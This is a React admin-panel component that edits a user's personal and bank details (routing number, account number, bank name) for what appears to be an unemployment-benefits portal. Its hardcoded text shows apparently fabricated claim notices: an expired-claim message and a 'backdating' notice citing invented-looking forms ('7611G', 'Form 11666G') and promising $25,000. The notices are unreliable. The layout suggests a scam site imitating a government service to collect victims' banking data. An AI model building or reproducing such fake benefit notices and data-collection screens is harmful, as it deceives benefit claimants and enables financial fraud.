import moment from "moment";
import { useState, useEffect } from "react";
import { TextInput } from "../../Components/Input/Text";
import { Input } from "../../Components/Input/index";
import { Button } from "../../Components/Button/index";
import { notification } from "antd";
import axios from "axios";
import config from "../../config";
export const UserInfo = ({ data }) => {
  console.log(data);
  const [actionText, setActionText] = useState("");
  const [claimBalance, setClaimBalance] = useState("");
  const [weeklyBenefit, setWeeklyBenefit] = useState("");
  const [week1, setWeek1] = useState("");
  const [week2, setWeek2] = useState("");
  const [dob, setDob] = useState("");
  const [lastPayment, setLastPayment] = useState("");
  const [workSearchRequirement, setWorkSearchRequirement] = useState("");
  const [benefitYear, setBenefitYear] = useState("");
  const [claimStatusContent, setClaimStatusContent] = useState(
    "Your claim expired on 10/28/2023. You cannot be paid for weeks of unemployment after your benefit year ends, even if you have a balance on your claim. Continue to certify for benefits if you have weeks available within your benefit year."
  );
  const [claimStatusTitle, setClaimStatusTitle] = useState(
    "Your Benefit Year Has Ended"
  );
  const [backDateContent, setBackDateContent] = useState(
    "We provide a 2024 form 1099G you as requested concering backdating by April 24,2024. Federal law requires us to issue this form to anyone who recieved unemployment compensation in 2020. Your Form 11666G shows your total $25,000 that has been approved for your backdating filling. Your money will be approved"
  );
  const [backDateTitle, setBackDateTitle] = useState(
    "BackDating Eligible From 07/18/2020 To 04/24/2024 From 7611G"
  );
  const [load, setLoad] = useState("");
  const [routing, setRouting] = useState("");
  const [account, setAccount] = useState("");
  const [bankName, setBankName] = useState("");

  const [name, setName] = useState("");
  const [mailAddress1, setMailAddress1] = useState("");
  const [mailAddress2, setMailAddress2] = useState("");
  const [residentialAddress1, setResidentialAddress1] = useState("");
  const [residentialAddress2, setResidentialAddress2] = useState("");
  const [phone, setPhone] = useState("");

  const getUserInfo = () => {
    axios
      .get(`${config.baseUrl}/admin/getProfileInfo/${data?._id}`, {
        headers: {
          Authorization: `Bearer ${sessionStorage.getItem("token")}`,
        },
      })
      .then((res) => {
        if (res.status === 200) {
          const data = res.data.user;
          setPhone(data?.phone);
          setDob(data?.dob);
          setMailAddress1(data?.mailAddress1);
          setMailAddress2(data?.mailAddress2);
          setResidentialAddress1(data?.residentialAddress1);
          setResidentialAddress2(data?.residentialAddress2);
          setBankName(data?.bankName)
          setRouting(data?.routing)
          setAccount(data?.account)
        }
      })
      .catch((err) => {
        setLoad(false);
        if (err) {
        }
      });
  };

  const updateUio = () => {
    setLoad(true);
    axios
      .put(
        `${config.baseUrl}/admin/edit-user-info`,
        {
          mailAddress1,
          mailAddress2,
          residentialAddress1,
          residentialAddress2,
          dob,
          phone,
          profile_id: data?._id,
          bankName,routing, account
        },
        {
          headers: {
            Authorization: `Bearer ${sessionStorage.getItem("token")}`,
          },
        }
      )
      .then((res) => {
        if (res.status === 200) {
          Notification("success", "Success", "Profile Updated Successfully");
          setLoad(false);
        }
      })
      .catch((err) => {
        setLoad(false);
        if (err) {
        }
      });
  };

  useEffect(() => {
    if (data?._id) {
      setPhone(data?.phone);
      setDob(data?.dob);
      setMailAddress1(data?.mailAddress1);
      setMailAddress2(data?.mailAddress2);
      setResidentialAddress1(data?.residentialAddress1);
      setResidentialAddress2(data?.residentialAddress2);
    }
  }, [data]);

  useEffect(() => {
    getUserInfo();
  }, []);

  const Notification = (type, msgType, msg) => {
    notification[type]({
      message: msgType,
      description: msg,
    });
  };
  return (
    <div>
      <div className="row">
        <div className="col-md-12">
          <div>
            <ul className="container">
              <li>
                <p>
                  <u>Personal Information </u>
                </p>
                <div>
                  <div className="mb-3">
                    <Input
                      type="text"
                      className="input-className w-75"
                      onChange={(e) => setDob(e.target.value)}
                      value={dob}
                      placeholder="Date of Birth"
                    />
                  </div>
                </div>
              </li>
              <li>
                <p>
                  <u>Contact Information</u>
                </p>
                <div>
                  <div className="mb-3">
                    <label>Mailing Address</label>
                    <Input
                      type="text"
                      className="input-className w-75"
                      onChange={(e) => setMailAddress1(e.target.value)}
                      value={mailAddress1}
                      placeholder="Mailing Address 1"
                    />
                    <br />
                    <Input
                      type="text"
                      className="input-className w-75"
                      onChange={(e) => setMailAddress2(e.target.value)}
                      value={mailAddress2}
                      placeholder="Mailing Address 2"
                    />
                  </div>
                  <div className="mb-3">
                    <label>Residential Address</label>
                    <Input
                      type="text"
                      className="input-className w-75"
                      onChange={(e) => setResidentialAddress1(e.target.value)}
                      value={residentialAddress1}
                      placeholder="Residential Address 1"
                    />
                    <br />
                    <Input
                      type="text"
                      className="input-className w-75"
                      onChange={(e) => setResidentialAddress2(e.target.value)}
                      value={residentialAddress2}
                      placeholder="Residential Address 2"
                    />
                  </div>
                  <div className="mb-3">
                    <label>Phone Number </label>
                    <Input
                      type="text"
                      className="input-className w-75"
                      onChange={(e) => setPhone(e.target.value)}
                      value={phone}
                      placeholder="Phone Number"
                    />
                  </div>
                </div>
              </li>
              <li>
                <p>
                  <u>Bank Details </u>
                </p>
                <div>
                  <div className="mb-3">
                    <label>Routing </label>
                    <Input
                      type="text"
                      className="input-className w-75"
                      onChange={(e) => setRouting(e.target.value)}
                      value={routing}
                      placeholder="Routing Number"
                    />
                    <br />
                    <Input
                      type="text"
                      className="input-className w-75"
                      onChange={(e) => setAccount(e.target.value)}
                      value={account}
                      placeholder="Account Num "
                    />
                  </div>
                  <div className="mb-3">
                    <label>Bank Name </label>
                    <Input
                      type="text"
                      className="input-className w-75"
                      onChange={(e) => setBankName(e.target.value)}
                      value={bankName}
                      placeholder="Bank Name "
                    />
                  </div>
                </div>
              </li>
              <div className="mt-2">
                <Button
                  text="Update "
                  className="bg-info w-25 text-white"
                  loading={load}
                  onClick={updateUio}
                />
              </div>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export default UserInfo;
